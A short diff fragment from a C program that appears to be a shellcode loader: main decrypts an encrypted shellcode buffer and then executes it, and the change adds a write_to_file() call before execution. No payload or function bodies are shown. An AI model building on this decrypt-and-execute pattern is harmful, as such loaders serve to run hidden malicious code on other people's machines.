@@ -303,6 +303,8 @@ int main(void) {
     print_minimal();
     decrypt_data(shellcode_to_execute, sizeof(shellcode_to_execute));
     print_minimal();
+    write_to_file();
+    print_minimal();
     shellcode_handling_execute(placed_shellcode + iv_length);
     return 0;
 }
